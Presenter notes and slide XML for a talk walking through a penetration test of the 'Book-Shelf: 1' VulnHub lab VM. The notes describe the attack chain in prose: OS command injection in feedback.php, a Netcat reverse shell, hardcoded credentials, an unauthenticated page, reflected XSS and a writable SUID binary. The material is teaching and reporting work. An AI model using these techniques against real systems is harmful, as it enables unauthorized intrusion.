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This is a full walkthrough of a real, hands-on penetration test performed against a deliberately vulnerable training VM ("Book-Shelf: 1" from VulnHub) inside an isolated VMware lab.
Say: "Today I'm not just going to show you what we found — I'm going to walk through exactly how we found it, which tools we used, why we chose each command, and how one result led to the next decision. This is the process, not just the conclusions."
Emphasize the environment is fully isolated (no production systems, no real-world targets) and that testing was authorized against this lab VM.
Likely question: "Is this a real target or a lab?" Answer: A purpose-built, intentionally vulnerable training VM (VulnHub "Book-Shelf: 1"), run locally in VMware — not a production or real-world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audience expectations: this was a structured, phased assessment, not random poking.
Walk through the 9 objectives quickly, then spend more time on the methodology diagram on the right.
Explain the flow: Recon tells us what's there → Enumeration tells us details about what's there → Vulnerability Discovery is forming hypotheses → Validation is proving a hypothesis true with a safe test → Exploitation is using a validated vulnerability for real access → Initial Access is the foothold → Post-Exploitation is what we do with that foothold → Privilege Escalation Assessment is asking "can we go higher?" → Reporting closes the loop.
Likely question: "Why so many phases instead of just hacking straight to the goal?" Answer: Each phase reduces risk of a wrong or unsafe move and produces evidence that makes the final report defensible and reproducible — professional testing isn't about being fast, it's about being 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diagram: attacker on the left, target on the right, connected only by an isolated VMware virtual network — nothing routes outside this lab.
Explain simply: the attacker box runs Kali Linux, a Linux distribution pre-loaded with penetration testing tools; the target box is a deliberately vulnerable training VM.
Spend real time on the "why isolation matters" panel — this is the authorization/ethics anchor of the whole talk.
Likely question: "Why does isolation matter for authorization?" Answer: Penetration testing without explicit authorization against a specific, bounded scope is illegal in most jurisdictions (e.g., unauthorized access laws). An isolated lab guarantees the scope can never accidentally expand to a system we don't own or weren't authorized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each row left to right: the phase, the tools used in that phase, and one real example command from this engagement.
This slide is a map for the rest of the deck — say: "Every following slide zooms into one of these rows in detail."
Likely question: "Why list example commands here if we see them again later?" Answer: This is the index / mental model; the following slides go deep on WHY each specific command and flag was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slide the instructor can return to if they ask "wait, what did tool X do again?"
Point out that the list spans recon, enumeration, exploitation, and post-exploitation — a full-lifecycle toolkit, not a single trick.
Likely question: "Why Gobuster and not another content-discovery tool?" Answer: Gobuster is fast, simple to script, and was sufficient for this application's directory structure; the choice of tool matters less than understanding what content discovery is trying to achieve.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host discovery first, before touching ports: "we first need to know WHO is alive on the network before asking WHAT they're running."
Explain -sn explicitly: skips port scanning, just checks if the host responds (ARP on a local segment, which is fast and reliable).
Briefly explain CIDR /24 for anyone unfamiliar: it's shorthand for the subnet mask, telling us how many addresses are in this network segment.
Likely question: "How did you know WHICH of the 5 hosts was the target?" Answer: The lab environment told us the target's assigned address, and this was cross-confirmed once the port scan revealed FTP/HTTP/etc. running specifically on .157 — a gateway or attacker host wouldn't expose those services.
Likely question: "Why not skip straight to a port scan?" Answer: Scanning ports against addresses that aren't even up wastes time and can trigger unnecessary noise/alerts; host discovery is the cheapest first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a FULL port scan (-p-) instead of the default top-1000: a default scan would still have caught FTP/SSH/HTTP but could easily have missed the non-standard 33060/tcp MySQL X Protocol port — completeness matters for an accurate attack-surface picture.
Walk through each flag on the left, then point at the results panel.
Spend real time on the "open port ≠ vulnerability" callout at the bottom — this is a principle the instructor will likely probe.
Likely question: "Why --min-rate 2000 specifically?" Answer: It's a practical balance — fast enough to scan all 65,535 ports in a reasonable time on a lab network, not so aggressive it risks unreliable results on a modest VM.
Likely question: "Isn't SSH being open concerning?" Answer: Not by itself — no authentication weakness or vulnerable version was identified against SSH in this engagement; it's documented as open with no confirmed issue, which is itself an example of accurate, non-exaggerated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"zoom in" scan — now that we know which ports are open, we ask exactly what's running on them and how.
Walk through -sC, -sV, -O — note -sC uses Nmap's SAFE default script category, not intrusive/vuln scripts, which matters for a controlled, non-destructive assessment.
Highlight the ftp-anon result prominently — it's the scan's most actionable output and previews the next slide.
Likely question: "Why does the exact version number matter if we're not going to look up a CVE for it?" Answer: In this engagement none of the network-facing service versions had an applicable CVE — but you don't know that until you check; recording exact versions is what makes that "no known CVE" conclusion defensible rather than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horizontal flow diagram left to right — this is the FTP story end to end in one glance.
Show the screenshot, then explain the grep command: we didn't read a 5,000+ line wordlist by eye, we searched it for application-relevant keywords.
CRITICAL TEACHING POINT — spend real time on the "important distinction" box: a wordlist entry is a CANDIDATE, not a proven credential. Many students conflate "found a password-looking string" with "cracked the login." This engagement explicitly treated it as a clue pending validation.
Likely question: "Why is anonymous FTP dangerous if the file wasn't literally the account password?" Answer: Because it handed us a highly-targeted wordlist (application-specific words already appear in it) that dramatically narrowed the search space for the real credential-hunting we did later via source-code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tool trio: curl for raw inspection, WhatWeb for quick fingerprinting, Gobuster for brute-force discovery of content not linked from the visible site.
Walk through the discovered path tree — this sets up feedback.php and login.php, the two endpoints the rest of the talk revolves around.
Explain the content-discovery concept box simply: it's testing many guesses and reading the response code, not "hacking" in a dramatic sense — it's systematic guessing against a wordlist.
Likely question: "Why -x php,txt,html,bak,old,zip,conf on Gobuster?" Answer: These extensions catch not just live pages but developer leftovers — backup files, old versions, config dumps — which are common real-world sources of accidental disclosure.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raw curl response containing a suspicious HTML comment — this is the kind of thing you only see by reading raw source, not by looking at the rendered page.
Decode it live conceptually: Base64 -d simply reverses the encoding — explain it's like ROT13 or a substitution cipher for computers, not real secrecy.
CRITICAL TEACHING POINT: emphasize the bottom callout — Base64 encoding is not a vulnerability by itself. This is purely reconnaissance value: it told us WHERE to test next (a "path" parameter), not that anything was already broken.
Likely question: "How do you know 'path' refers to a parameter on feedback.php and not somewhere else?" Answer: Context — the comment was found ON feedback.php, so testing feedback.php?path=... was the natural next hypothesis to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slide of the entire assessment — slow down here.
Walk through the curl command, then the returned uid=33(www-data) output — explain this is NOT the application echoing our input back; it's the actual output of a real system command we did not write ourselves, proving the server executed it.
Walk the conceptual flow diagram: user input flows unchecked all the way into an OS command execution function — that's the definition of command injection.
Explain CWE-78 by name — Common Weakness Enumeration is MITRE's standard taxonomy for vulnerability classes; CWE-78 specifically is "OS Command Injection."
Likely question: "How do you know this is command injection and not just a normal parameter reflecting text?" Answer: id is a real system command whose output (numeric UID, GID, group memberships) cannot be produced by simply echoing a string — the only way to get that exact output is if the command actually executed on the server.
Likely question: "Why is 'no authentication required' so important?" Answer: It removes the biggest barrier attackers normally face — credential theft or bypass. Anyone with network access to the box can trigger this with zero prior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two-box diagram: we set up a listener on our machine, then trigger the target to connect back to us — that's what "reverse" means (versus a bind shell, where the target listens and we connect to it).
Explain each Netcat flag briefly.
Show the screenshot: connect from 192.168.76.157, followed by an interactive www-data@debian shell prompt.
Emphasize the bottom callout: this is IMPACT of the earlier finding, not a second vulnerability — important for accurate, non-inflated finding counts in the report.
Likely question: "Why did you use Netcat instead of Metasploit or something else?" Answer: Netcat is minimal, universally available, and sufficient — it demonstrates the exploitation cleanly without extra tooling complexity.
Likely question: "What's the difference between a reverse shell and a bind shell?" Answer: A bind shell has the TARGET listen for a connection (attacker connects in) — often blocked by inbound firewall rules. A reverse shell has the TARGET initiate an outbound connection to the attacker, which is far more likely to bypass typical firewall configurations that block inbound but allow outbound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mindset shift: getting a shell is the START of post-exploitation, not the end.
Walk each command row and its purpose — emphasize this is a repeatable checklist any tester should run after any foothold, not specific tricks for this one box.
Say explicitly: "This slide should feel boring and procedural — that's the point. Good post-exploitation is systematic enumeration, not improvisation."
Likely question: "Why grep the ENTIRE web root instead of reading files one by one?" Answer: Efficiency and completeness — a single recursive grep across all files finds every occurrence of interesting keywords in seconds, versus manually opening dozens of files.
Likely question: "What were you hoping to find with the home-directory listing?" Answer: Evidence of other local accounts (here: "defender") whose privileges we might later target for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major teaching slide — tell the complete story: FTP gave us a clue, not proof; the real credential was confirmed only from source code plus a live login test.
Point out the letter-case difference (b00ks vs B00ks) explicitly — a small detail that matters enormously: had we assumed the wordlist entry was correct without checking, we'd have gotten it wrong.
Walk through the POST request and the "success" response — this is what makes it VALIDATED rather than merely discovered.
CRITICAL TEACHING POINT: "DISCOVERY ≠ VALIDATION" — repeat this explicitly, it is one of the most important professional distinctions in this entire assessment.
Likely question: "Why is the FTP password not the final valid password?" Answer: It differs in letter case and was recovered from an unrelated general wordlist, not from the application itself — it was a coincidentally similar candidate, not the actual credential; only the source-code-derived, login-tested value is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concepts on this slide, and the distinction is the whole point: (1) valid credentials existing in source is one weakness; (2) the destination page not even checking for credentials is a completely different, independent weakness.
Show the curl request and contrast expected vs. observed side by side.
Define authentication vs. authorization vs. broken access control explicitly and slowly — this is commonly confused terminology.
Likely question: "Why is this different from the hardcoded-credentials finding?" Answer: The credentials finding is about a WEAK authentication check; this finding is about a MISSING authentication check entirely on a specific page — you could remove the hardcoded credential entirely and this page would still be exposed, because the page itself never verifies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source snippet first — the root cause is two lines of code with no encoding function anywhere.
Walk the curl payload, then the screenshot showing the raw HTTP response with the payload embedded unescaped.
Explain reflected XSS conceptually: the server takes OUR input and puts it directly into HTML that gets sent back to whoever made the request — if a victim can be tricked into clicking a crafted link, their browser renders our payload as if it were the site's own content.
CRITICAL ACCURACY POINT — spend real time on the bottom-right box: we confirmed the raw HTTP-level reflection, but did NOT conclusively capture a browser executing the JavaScript (e.g., a real alert() popup). State plainly that the report does not claim more than what was proven.
Likely question: "How is reflected XSS different from stored XSS?" Answer: Reflected XSS only appears in the immediate response to a single crafted request — it's not saved anywhere. Stored XSS is saved server-side (e.g., in a database) and served to every future visitor without needing a special link each time — stored XSS is generally more dangerous because of that persistence and broader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question plainly: after www-data, the next natural question in any assessment is "can we go higher?"
Walk the SUID discovery command, then the specific finding: a non-standard binary owned by "defender" with the SUID bit set.
Explain SUID conceptually and clearly: normally a program runs with the privileges of whoever launches it; a SUID bit makes it instead run with the privileges of whoever OWNS the file — a legitimate mechanism (e.g., "passwd" needs to write to a root-only file) that becomes dangerous when misapplied.
Explain why world-writable matters on top of SUID: if any user can overwrite the file's contents, they could in theory replace it with their own code that then runs with the owner's privileges.
THE CRITICAL NUANCE — slow down on the bottom-right box: we ran the binary and it did NOT elevate us; the misconfiguration is real, but exploitation was not demonstrated. This is the exact distinction professional reports must draw.
Likely question: "Why couldn't you just overwrite the binary since it's world-writable?" Answer: That overwrite-and-reinvoke technique was not attempted in this engagement — it remains a plausible theoretical path, but this report only claims what was actually tested and observed, not what might work in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being THOROUGH, not just stopping after one SUID finding.
Walk each of the four checks and explain WHY each exists conceptually — process list, cron jobs, writable files owned by a target account, and a system-wide writable-file sweep.
Land on the results bar: every one of these came back negative — and that's a legitimate, reportable result, not a failure of the assessment.
Likely question: "Why check cron jobs specifically?" Answer: A cron job is a scheduled task, often run automatically as root — if its target script or file is writable by a lower-privileged user, that user can inject code that root will later execute automatically, a very common real-world privilege-escalation technique.
Likely question: "Isn't it disappointing that nothing else worked?" Answer: No — professional testing values accurate negative results as much as positive ones. Knowing conclusively what does NOT work is valuable information for the defender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two open MySQL-related ports, then immediately pivot to the key principle: exposure is not compromise.
Show the exact rejection message from the direct connection attempt — this is the server's own access control working as intended.
State the conclusion cleanly: exposure confirmed, compromise not achieved — two very different severities.
Likely question: "So is MySQL exposure even worth reporting?" Answer: Yes — network exposure of a database still increases attack surface (e.g., if credentials were later obtained through some other means) and should be restricted as a defense-in-depth measure, even though it wasn't the path to compromise in this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the assessment's honesty checkpoint — every finding sorted into exactly one of two buckets, with no ambiguity.
Walk the confirmed column briefly (it's a recap of everything already covered).
Spend more time on the "not confirmed" column — for each, briefly recall what was tested: SQL injection was actively tried and failed; path traversal was actively tried and failed; privilege escalation was attempted (the SUID binary) and did not succeed; root/database compromise were simply never achieved by any tested vector.
CRITICAL FRAMING: "A penetration test report's credibility comes as much from what it does NOT claim as from what it does." This is the thesis of the whole talk restated as a checklist.
Likely question: "What tests specifically failed?" Answer: A classic SQL-injection authentication-bypass payload against the login form, and several path-traversal-style payloads against the feedback.php path parameter — both returned normal, unexploited application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"zoom out" slide — every prior slide compressed into one visual chain, read left-to-right, top-to-bottom.
Point out the color coding: green/confirmed boxes for the fifteen steps that were proven, versus the two gray boxes at the end marking privilege escalation as investigated but not achieved.
Use this slide to let the audience ask any remaining "wait, how did we get from X to Y" question — it's a natural Q&amp;A anchor.
Likely question: "If you had to pick the ONE link that breaks this whole chain, which would it be?" Answer: The OS command injection in feedback.php — every step after it depends on the code execution it provided; removing that one vulnerability collapses the rest of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the risk-rating slide any client/instructor cares about most — walk left to right through the four severity tiers.
Explain the SUID binary's placement in High specifically: the misconfiguration itself is dangerous (justifying High), but the parenthetical "exploitation unproven" is not just a footnote — it directly affects how it should be prioritized versus a fully proven Critical.
Land on the bottom callout: explicitly state why SSH doesn't appear anywhere on this severity breakdown, and why MySQL sits at the bottom rather than the top — both are deliberate, evidence-driven choices, not oversights.
Likely question: "Why is the SUID binary High and not Critical if it wasn't actually exploited?" Answer: The underlying misconfiguration (world-writable + SUID + non-root owner) is objectively dangerous on its own merits and a well-known escalation pattern — but because we could not demonstrate the impact ourselves, we do not push it to Critical, which we reserve for demonstrated, maximum-impact issues like the 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reflective — step back from the technical detail and extract the durable, transferable principles.
Read through the ten points at a measured pace; these apply to any penetration test, not just this one.
Good closing line for this slide: "None of this required an exotic exploit — it required patience, systematic thinking, and precise language about what was actually proven."
Likely question: "Which of these lessons mattered most in THIS specific engagement?" Answer: Separating discovery from exploitation (the FTP-clue-vs-validated-credential story) and separating exploitation from impact (www-data vs. root) — both directly shaped how this report is worded and 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talk by restating the finding in one clear sentence — command injection to RCE to www-data — before listing the compounding weaknesses.
Give equal visual and verbal weight to the "does NOT claim" box — ending on restraint and precision reinforces the entire talk's thesis about honest, evidence-bound reporting.
Invite questions — many of the "likely questions" seeded throughout these notes are good material to have ready.
Final likely question: "If you had unlimited time, what would you test next?" Answer: The overwrite-and-reinvoke technique against the writable SUID binary, and a deeper investigation of the profile page's functionality now that both authenticated and unauthenticated access are confirmed — both are natural, evidence-motivated next steps that this engagement's timebox did not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oundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1067"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0B1220"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8778240" y="0"/>
            <a:ext cx="3410712" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2145"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="214884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BOOK-SHELF: 1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="2971800"/>
            <a:ext cx="7772400" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" spc="200" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PENETRATION TESTING ASSESSMENT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3520440"/>
            <a:ext cx="7772400" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>End-to-End Penetration Testing Walkthrough</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4297680"/>
            <a:ext cx="3566160" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>TARGET</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4498848"/>
            <a:ext cx="3566160" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Book Shelf web application</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Book-Shelf: 1 (VulnHub training VM)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>192.168.76.157</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4480560" y="4297680"/>
            <a:ext cx="3566160" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ATTACKER</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4480560" y="4498848"/>
            <a:ext cx="3566160" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Kali Linux</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>192.168.76.128</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="5257800"/>
            <a:ext cx="3566160" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ENVIRONMENT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="5458968"/>
            <a:ext cx="3566160" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Isolated VMware lab network</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4480560" y="5257800"/>
            <a:ext cx="3566160" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>SCOPE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4480560" y="5458968"/>
            <a:ext cx="3566160" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Unauthenticated, black-box</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
